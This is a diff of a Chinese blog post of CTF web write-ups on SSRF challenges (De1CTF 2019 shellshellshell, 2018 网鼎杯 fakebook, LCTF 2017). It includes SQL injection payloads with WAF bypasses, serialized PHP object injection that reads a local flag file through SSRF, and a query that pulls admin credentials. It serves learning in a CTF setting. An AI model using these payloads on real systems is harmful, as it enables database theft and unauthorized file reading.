@@ -82,13 +82,13 @@
 
 
 
-<meta name="description" content="2019 De1ctf shellshellshell这个网站长这样:  然后他的api都是 index.php?action=index index.php?action=publish index.php?action=logout 之类的 Source code linking:  http://127.0.0.1:8302/view/(many source file) Guess the">
+<meta name="description" content="2019 De1ctf shellshellshell 这个网站长这样:  然后他的api都是 index.php?action=index index.php?action=publish index.php?action=logout 之类的 Source code linking: http://127.0.0.1:8302/view/(many source file) Guess the">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSRF 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/06/05/SSRF/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="2019 De1ctf shellshellshell这个网站长这样:  然后他的api都是 index.php?action=index index.php?action=publish index.php?action=logout 之类的 Source code linking:  http://127.0.0.1:8302/view/(many source file) Guess the">
+<meta property="og:description" content="2019 De1ctf shellshellshell 这个网站长这样:  然后他的api都是 index.php?action=index index.php?action=publish index.php?action=logout 之类的 Source code linking: http://127.0.0.1:8302/view/(many source file) Guess the">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/62526250-78404480-b86b-11e9-9e2c-ccab6f04e184.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/62533827-34a10700-b87a-11e9-88d5-60888db5dc73.png">
@@ -104,7 +104,7 @@
 <meta property="og:updated_time" content="2019-12-15T09:57:57.827Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF 题型记录[working forever]">
-<meta name="twitter:description" content="2019 De1ctf shellshellshell这个网站长这样:  然后他的api都是 index.php?action=index index.php?action=publish index.php?action=logout 之类的 Source code linking:  http://127.0.0.1:8302/view/(many source file) Guess the">
+<meta name="twitter:description" content="2019 De1ctf shellshellshell 这个网站长这样:  然后他的api都是 index.php?action=index index.php?action=publish index.php?action=logout 之类的 Source code linking: http://127.0.0.1:8302/view/(many source file) Guess the">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/62526250-78404480-b86b-11e9-9e2c-ccab6f04e184.png">
 
 
@@ -432,26 +432,32 @@
       
 
       
-        <h2 id="2019-De1ctf-shellshellshell"><a href="#2019-De1ctf-shellshellshell" class="headerlink" title="2019 De1ctf shellshellshell"></a>2019 De1ctf shellshellshell</h2><p>这个网站长这样:</p>
+        <h2 id="2019-De1ctf-shellshellshell">2019 De1ctf shellshellshell</h2>
+<p>这个网站长这样:</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/62526250-78404480-b86b-11e9-9e2c-ccab6f04e184.png" alt="QQ截图20190806165844"></p>
 <p>然后他的api都是</p>
 <p>index.php?action=index</p>
 <p>index.php?action=publish</p>
 <p>index.php?action=logout</p>
 <p>之类的</p>
-<p>Source code linking: </p>
+<p>Source code linking:</p>
 <p><a href="http://127.0.0.1:8302/view/" target="_blank" rel="noopener">http://127.0.0.1:8302/view/</a>(many source file)</p>
 <p>Guess the existence of <code>user.php</code> and <code>config.php</code>,and try several ways to get access to it .</p>
-<p><a href="http://127.0.0.1:8302/user.php" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php</a>~<br><a href="http://127.0.0.1:8302/user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.bak</a><br><a href="http://127.0.0.1:8302/user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.swp</a><br><a href="http://127.0.0.1:8302/.user.php" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php</a>~<br><a href="http://127.0.0.1:8302/.user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.bak</a><br><a href="http://127.0.0.1:8302/.user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.swp</a></p>
-<p><a href="http://127.0.0.1:8302/config.php" target="_blank" rel="noopener">http://127.0.0.1:8302/config.php</a>~</p>
+<p><a href="http://127.0.0.1:8302/user.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php~</a><br>
+<a href="http://127.0.0.1:8302/user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.bak</a><br>
+<a href="http://127.0.0.1:8302/user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/user.php.swp</a><br>
+<a href="http://127.0.0.1:8302/.user.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php~</a><br>
+<a href="http://127.0.0.1:8302/.user.php.bak" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.bak</a><br>
+<a href="http://127.0.0.1:8302/.user.php.swp" target="_blank" rel="noopener">http://127.0.0.1:8302/.user.php.swp</a></p>
+<p><a href="http://127.0.0.1:8302/config.php~" target="_blank" rel="noopener">http://127.0.0.1:8302/config.php~</a></p>
 <p>See exploitment:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signature=1`,`O:4:&quot;Mood&quot;:3:&#123;s:4:&quot;mood&quot;;i:1;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;s:4:&quot;date&quot;;s:1:&quot;0&quot;;&#125;`),(4,`bbb`,(select concat(username,password) from ctf_users where is_admin=1),`O:4:&quot;Mood&quot;:3:&#123;s:4:&quot;mood&quot;;i:1;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;s:4:&quot;date&quot;;s:1:&quot;0&quot;;&#125;`)#&amp;mood=0</span><br></pre></td></tr></table></figure>
-
 <p>check the phpinfo( I made this in docker , here might be some error, anyway):</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/62533827-34a10700-b87a-11e9-88d5-60888db5dc73.png" alt="QQ截图20190806184325"></p>
 <p><a href="https://blog.csdn.net/loongwong2011/article/details/52155046" target="_blank" rel="noopener">simple talk about soap,http,tcp,ip</a></p>
 <p><img src="https://user-images.githubusercontent.com/40637063/62526153-44651f00-b86b-11e9-91b2-e210de8fb838.png" alt="QQ截图20190806165527"></p>
-<h2 id="2018网鼎杯-fakebook"><a href="#2018网鼎杯-fakebook" class="headerlink" title="2018网鼎杯 fakebook"></a>2018网鼎杯 fakebook</h2><p><img src="https://user-images.githubusercontent.com/40637063/61576225-e665d700-ab09-11e9-8a70-de85e976bb8c.png" alt="image"></p>
+<h2 id="2018网鼎杯-fakebook">2018网鼎杯 fakebook</h2>
+<p><img src="https://user-images.githubusercontent.com/40637063/61576225-e665d700-ab09-11e9-8a70-de85e976bb8c.png" alt="image"></p>
 <p>这里有登录和注册功能.注册的时候除了常规的信息之外还让我们填写了博客地址.填写完之后登录是这样的</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/61576261-583e2080-ab0a-11e9-9736-f2cbc5dc2210.png" alt="image"></p>
 <p>点进个人链接会发现页面会尝试去获取博客的内容:</p>
@@ -459,34 +465,27 @@
 <p><img src="https://user-images.githubusercontent.com/40637063/61576271-828fde00-ab0a-11e9-8eaf-ee2787669db0.png" alt="image"></p>
 <p>首先发现<code>robots.txt</code> 中有<code>user.php.bak</code>.访问获得源码.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>容易看出,服务端要去访问我们给他传递的博客地址,这里没有任何防护,也就是说存在<code>ssrf</code>漏洞.</p>
 <p>通过扫描和盲猜,可以发现<code>flag.php</code>的存在.</p>
 <p>那么就可以让本来应该去访问博客的服务端去访问他自己的<code>flag.php</code>.</p>
 <p>另外,在内容展示的页面发现了一处注入(参数no):</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/61576295-fb8f3580-ab0a-11e9-8c28-fd9c6b5277f8.png" alt="image"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1%20union%20select%201,1,1,1%23</span><br></pre></td></tr></table></figure>
-
 <p>结果被waf检测到了,那么可以把空格用注释符号来替代:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,1,1,1%23</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://user-images.githubusercontent.com/40637063/61576335-8e2fd480-ab0b-11e9-9e13-e7952db8439d.png" alt="image"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),1)%23</span><br><span class="line"></span><br><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),&apos;~&apos;),1)%23</span><br></pre></td></tr></table></figure>
-
 <p>然后逐个查看字段的内容,一直到data字段:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(data) from users),&apos;~&apos;),1)%23</span><br></pre></td></tr></table></figure>
-
 <p>回显如下:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] query error! (XPATH syntax error: &apos;~O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:&apos;)</span><br></pre></td></tr></table></figure>
-
-<p>一个序列化字符串………………….可以想到这里可能是将data字段进行反序列化之后在页面上进行回显.由此而产生的payload:</p>
+<p>一个序列化字符串…可以想到这里可能是将data字段进行反序列化之后在页面上进行回显.由此而产生的payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web23.buuoj.cn/view.php?no=-1/**/union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos; #</span><br></pre></td></tr></table></figure>
-
 <p>而对空格的waf似乎也只是针对union而已.</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/61576614-ace39a80-ab0e-11e9-9508-2f78be14488a.png" alt="image"></p>
 <p><img src="https://user-images.githubusercontent.com/40637063/61575863-22963900-ab04-11e9-99ee-6f9c76db029d.png" alt="image"></p>
-<h2 id="LCTF-2017-签到题"><a href="#LCTF-2017-签到题" class="headerlink" title="LCTF-2017-签到题"></a>LCTF-2017-签到题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(!$_GET[&apos;site&apos;])&#123; </span><br><span class="line">	$str = &lt;&lt;&lt;EOD</span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">look source code: </span><br><span class="line">&lt;form action=&apos;&apos; method=&apos;GET&apos;&gt; </span><br><span class="line">&lt;input type=&apos;submit&apos; name=&apos;submit&apos; /&gt; </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;site&apos; style=&quot;width:1000px&quot; value=&quot;https://www.baidu.com&quot;/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">EOD;</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">	die(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;site&apos;]; </span><br><span class="line">$url_schema = parse_url($url); </span><br><span class="line">$host = $url_schema[&apos;host&apos;]; </span><br><span class="line">$request_url = $url.&quot;/&quot;; </span><br><span class="line"></span><br><span class="line">if ($host !== &apos;www.baidu.com&apos;)&#123; </span><br><span class="line">	die(&quot;wrong site&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ci = curl_init();</span><br><span class="line">curl_setopt($ci, CURLOPT_URL, $request_url);</span><br><span class="line">curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$res = curl_exec($ci);</span><br><span class="line">curl_close($ci);</span><br><span class="line"></span><br><span class="line">if($res)&#123; </span><br><span class="line">	echo &quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;; </span><br><span class="line">	echo $request_url; </span><br><span class="line">	echo &quot;&lt;hr /&gt;&quot;; </span><br><span class="line">	echo htmlentities($res); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">	echo &quot;get source failed&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
+<h2 id="LCTF-2017-签到题">LCTF-2017-签到题</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(!$_GET[&apos;site&apos;])&#123; </span><br><span class="line">	$str = &lt;&lt;&lt;EOD</span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">look source code: </span><br><span class="line">&lt;form action=&apos;&apos; method=&apos;GET&apos;&gt; </span><br><span class="line">&lt;input type=&apos;submit&apos; name=&apos;submit&apos; /&gt; </span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;site&apos; style=&quot;width:1000px&quot; value=&quot;https://www.baidu.com&quot;/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">EOD;</span><br><span class="line"></span><br><span class="line">echo $str;</span><br><span class="line">	die(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;site&apos;]; </span><br><span class="line">$url_schema = parse_url($url); </span><br><span class="line">$host = $url_schema[&apos;host&apos;]; </span><br><span class="line">$request_url = $url.&quot;/&quot;; </span><br><span class="line"></span><br><span class="line">if ($host !== &apos;www.baidu.com&apos;)&#123; </span><br><span class="line">	die(&quot;wrong site&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ci = curl_init();</span><br><span class="line">curl_setopt($ci, CURLOPT_URL, $request_url);</span><br><span class="line">curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$res = curl_exec($ci);</span><br><span class="line">curl_close($ci);</span><br><span class="line"></span><br><span class="line">if($res)&#123; </span><br><span class="line">	echo &quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;; </span><br><span class="line">	echo $request_url; </span><br><span class="line">	echo &quot;&lt;hr /&gt;&quot;; </span><br><span class="line">	echo htmlentities($res); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">	echo &quot;get source failed&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>Keypoint:</p>
 <ul>
 <li>using protocal <code>file</code> to read local file</li>
@@ -608,7 +607,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -786,7 +785,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">59.7k</span>
+    <span title="Site words total count">61.5k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
